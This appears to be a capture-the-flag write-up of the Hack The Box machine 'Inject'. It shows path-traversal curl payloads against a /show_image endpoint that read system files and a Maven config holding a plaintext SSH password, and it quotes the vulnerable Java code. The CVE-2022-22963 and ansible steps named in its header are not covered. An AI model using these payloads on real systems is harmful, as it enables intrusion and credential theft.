# Default Information
OS: Linux
Vulnerabilties exploited: LFI, CVE-2022-22963, ansible

# Nmap
Executing our usual nmap, we can see that this machine is a relatively simple machine with only port 22 and port 8080  being exposed to the public

```bash
PORT      STATE    SERVICE      REASON      VERSION
22/tcp    open     ssh          syn-ack     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
8080/tcp  open     nagios-nsca  syn-ack     Nagios NSCA
|_http-title: Home
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
```

# Enumerating Port 8080
Exploring http://inject.htb:8080, we discover an ```/upload``` endpoint that allows us to save an image file and the saved image file is saved to http://inject.htb:8080/show_image?img=<file name>
  
In the uploaded image url,  we are able to find a LFI vulnerability that can be exploited

![LFI exploitation](https://github.com/joelczk/writeups/blob/main/HTB/Images/Inject/inject_lfi.png)
  
Bruteforcing the endpoints, we notice that we can access the following endpoints
```
/etc/passwd
/etc/group
/etc/hosts
/etc/issue
/etc/crontab
/etc/fstab
/etc/nginx/nginx.conf
/etc/nginx/sites-available/default
/etc/ssh/sshd_config
/proc/self/fd/5
/proc/self/fd/4
/etc/shells
```
  
However, this LFI vulnerability is different from the typical LFI vulnerability as we are able to list the directory contents and we do not need to know the full file path to list the file contents. For example, we can use ```/home``` as the payload to list all the files and directories in the ```/home``` directory
  
```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ curl http://inject.htb:8080/show_image?img=../../../../../../home
frank
phil
```
  
Using the LFI vulnerability, we can obtain the SSH password for the ```phil``` user
  
```
┌──(kali㉿kali)-[~/Desktop]
└─$ curl http://inject.htb:8080/show_image?img=../../../../../../home/frank/.m2/settings.xml
<?xml version="1.0" encoding="UTF-8"?>
<settings xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
  <servers>
    <server>
      <id>Inject</id>
      <username>phil</username>
      <password>DocPhillovestoInject123</password>
      <privateKey>${user.home}/.ssh/id_dsa</privateKey>
      <filePermissions>660</filePermissions>
      <directoryPermissions>660</directoryPermissions>
      <configuration></configuration>
    </server>
  </servers>
</settings>
```
  
However, we realize that we are unable to login as phil user via SSH with the password that we have obtained. This is because ```phil``` is denied from SSH access in the ```/etc/ssh/sshd_config``` file

```
┌──(kali㉿kali)-[~/Desktop]
└─$ curl http://inject.htb:8080/show_image?img=../../../../../../etc/ssh/sshd_config | grep DenyUsers
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  3304  100  3304    0     0   3275      0  0:00:01  0:00:01 --:--:--  3277
DenyUsers phil
```

# Afterthoughts
## Analysis of LFI
After digging furthur at the LFI, I was able to find the source of the vulnerability at the ```getImage``` function at ```/var/www/WebApp/src/main/java/com/example/WebApp/user/UserController.java```
  
```
    @RequestMapping(value = "/show_image", method = RequestMethod.GET)
    public ResponseEntity getImage(@RequestParam("img") String name) {
        String fileName = UPLOADED_FOLDER + name;
        Path path = Paths.get(fileName);
        Resource resource = null;
        try {
            resource = new UrlResource(path.toUri());
        } catch (MalformedURLException e){
            e.printStackTrace();
        }
        return ResponseEntity.ok().contentType(MediaType.IMAGE_JPEG).body(resource);
    }
```  

  
  
